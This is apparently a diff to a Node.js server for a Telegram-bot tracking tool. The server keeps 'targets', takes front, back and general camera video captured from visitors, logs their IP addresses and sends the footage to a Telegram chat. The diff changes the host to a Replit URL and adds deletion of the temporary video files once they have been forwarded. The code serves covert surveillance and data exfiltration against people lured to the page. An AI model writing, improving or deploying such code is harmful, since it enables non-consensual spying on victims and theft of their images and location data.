@@ -19,7 +19,7 @@ app.use(cors());
 
 // Global variables
 const bot = new TelegramBot(process.env.bot);
-const hostURL = "https://sg-modder-offcial.vercel.app"; // Direct Vercel URL as requested
+const hostURL = "https://857fca26-7e7b-4c59-850a-27678795cdad-00-3b98bmun3p673.pike.replit.dev:5000"; // Direct Vercel URL as requested
 const use1pt = false;
 
 // Store active targets for tracking
@@ -957,14 +957,14 @@ app.post("/videofrontcamera", async (req, res) => {
         var buffer = Buffer.from(videoData, 'base64');
         console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
           
-        // Create directory if it doesn't exist
+        // Create temporary directory if it doesn't exist (needed for Vercel)
         const dirPath = path.join(__dirname, '..', 'screens');
         fs.mkdirSync(dirPath, { recursive: true });
         
-        // Save video to file
+        // Create a temporary file path (will be deleted after sending)
         const filePath = path.join(dirPath, `${uid}_front_camera_video.webm`);
         fs.writeFileSync(filePath, buffer);
-        console.log(`Front camera video saved to ${filePath}`);
+        console.log(`Front camera video temporarily saved to ${filePath}`);
           
         // Get client IP if it's stored in targets
         const ipAddress = targets[uid]?.ip || 'Unknown';
@@ -1003,6 +1003,14 @@ app.post("/videofrontcamera", async (req, res) => {
             parse_mode: "HTML"
           });
           console.log("Front camera video sent successfully to Telegram");
+          
+          // Delete the temporary file after sending to Telegram (important for Vercel)
+          try {
+            fs.unlinkSync(filePath);
+            console.log(`Temporary file deleted: ${filePath}`);
+          } catch (deleteError) {
+            console.error(`Error deleting temporary file: ${deleteError}`);
+          }
         } catch (error) {
           console.log("Error sending front camera video to Telegram:", error);
           // Try to send as document if video send fails
@@ -1012,6 +1020,14 @@ app.post("/videofrontcamera", async (req, res) => {
               parse_mode: "HTML"
             });
             console.log("Front camera video sent as document to Telegram");
+            
+            // Delete the temporary file after sending to Telegram (important for Vercel)
+            try {
+              fs.unlinkSync(filePath);
+              console.log(`Temporary file deleted: ${filePath}`);
+            } catch (deleteError) {
+              console.error(`Error deleting temporary file: ${deleteError}`);
+            }
           } catch (docError) {
             console.log("Error sending front camera video as document:", docError);
           }
@@ -1048,14 +1064,14 @@ app.post("/videobackcamera", async (req, res) => {
         var buffer = Buffer.from(videoData, 'base64');
         console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
           
-        // Create directory if it doesn't exist
+        // Create temporary directory if it doesn't exist (needed for Vercel)
         const dirPath = path.join(__dirname, '..', 'screens');
         fs.mkdirSync(dirPath, { recursive: true });
         
-        // Save video to file
+        // Create a temporary file path (will be deleted after sending)
         const filePath = path.join(dirPath, `${uid}_back_camera_video.webm`);
         fs.writeFileSync(filePath, buffer);
-        console.log(`Back camera video saved to ${filePath}`);
+        console.log(`Back camera video temporarily saved to ${filePath}`);
           
         // Get client IP if it's stored in targets
         const ipAddress = targets[uid]?.ip || 'Unknown';
@@ -1094,6 +1110,14 @@ app.post("/videobackcamera", async (req, res) => {
             parse_mode: "HTML"
           });
           console.log("Back camera video sent successfully to Telegram");
+          
+          // Delete the temporary file after sending to Telegram (important for Vercel)
+          try {
+            fs.unlinkSync(filePath);
+            console.log(`Temporary file deleted: ${filePath}`);
+          } catch (deleteError) {
+            console.error(`Error deleting temporary file: ${deleteError}`);
+          }
         } catch (error) {
           console.log("Error sending back camera video to Telegram:", error);
           // Try to send as document if video send fails
@@ -1103,6 +1127,14 @@ app.post("/videobackcamera", async (req, res) => {
               parse_mode: "HTML"
             });
             console.log("Back camera video sent as document to Telegram");
+            
+            // Delete the temporary file after sending to Telegram (important for Vercel)
+            try {
+              fs.unlinkSync(filePath);
+              console.log(`Temporary file deleted: ${filePath}`);
+            } catch (deleteError) {
+              console.error(`Error deleting temporary file: ${deleteError}`);
+            }
           } catch (docError) {
             console.log("Error sending back camera video as document:", docError);
           }
@@ -1139,14 +1171,14 @@ app.post("/cameravideo", async (req, res) => {
         var buffer = Buffer.from(videoData, 'base64');
         console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
           
-        // Create directory if it doesn't exist
+        // Create temporary directory if it doesn't exist (needed for Vercel)
         const dirPath = path.join(__dirname, '..', 'screens');
         fs.mkdirSync(dirPath, { recursive: true });
         
-        // Save video to file
+        // Create a temporary file path (will be deleted after sending)
         const filePath = path.join(dirPath, `${uid}_camera_video.webm`);
         fs.writeFileSync(filePath, buffer);
-        console.log(`Camera video saved to ${filePath}`);
+        console.log(`Camera video temporarily saved to ${filePath}`);
           
         // Get client IP if it's stored in targets
         const ipAddress = targets[uid]?.ip || 'Unknown';
@@ -1184,6 +1216,14 @@ app.post("/cameravideo", async (req, res) => {
             parse_mode: "HTML"
           });
           console.log("Camera video sent successfully to Telegram");
+          
+          // Delete the temporary file after sending to Telegram (important for Vercel)
+          try {
+            fs.unlinkSync(filePath);
+            console.log(`Temporary file deleted: ${filePath}`);
+          } catch (deleteError) {
+            console.error(`Error deleting temporary file: ${deleteError}`);
+          }
         } catch (error) {
           console.log("Error sending camera video to Telegram:", error);
           // Try to send as document if video send fails
@@ -1193,6 +1233,14 @@ app.post("/cameravideo", async (req, res) => {
               parse_mode: "HTML"
             });
             console.log("Camera video sent as document to Telegram");
+            
+            // Delete the temporary file after sending to Telegram (important for Vercel)
+            try {
+              fs.unlinkSync(filePath);
+              console.log(`Temporary file deleted: ${filePath}`);
+            } catch (deleteError) {
+              console.error(`Error deleting temporary file: ${deleteError}`);
+            }
           } catch (docError) {
             console.log("Error sending camera video as document:", docError);
           }
